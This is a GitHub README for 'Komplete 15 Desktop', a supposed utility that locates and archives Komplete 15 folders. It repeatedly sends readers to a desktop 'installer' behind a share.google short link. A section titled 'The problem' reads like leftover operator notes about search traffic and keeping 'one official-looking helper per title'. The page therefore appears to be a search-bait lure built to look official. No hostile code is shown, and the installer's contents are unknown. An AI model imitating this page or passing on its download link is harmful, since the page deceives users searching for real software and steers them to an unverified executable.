![Komplete 15 Desktop](assets/hero.png)

# Komplete 15 Desktop

*Find the Komplete 15 folder fast and keep a local spare.*

## What Komplete 15 Desktop is

This repository is **Komplete 15 Desktop**, a Windows utility. Find the Komplete 15 folder fast and keep a local spare.

Patches move Komplete 15 project paths without warning.

It runs on the local PC. No account, and nothing is uploaded.

## Editions

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## What it does

- Locates Komplete 15 user data on Windows and macOS.
- Archives project folders without touching the live install.
- Optional preview so nothing is written until you say so.
- Prints the paths it used.

## The problem

Search traffic for Komplete 15 is the product name plus desktop.

Keep one official-looking helper per title.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## Usage

Python 3.11 or newer. From the repository root:

```powershell
pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/heather8387/komplete-15-desktop

MIT license. See `LICENSE`.
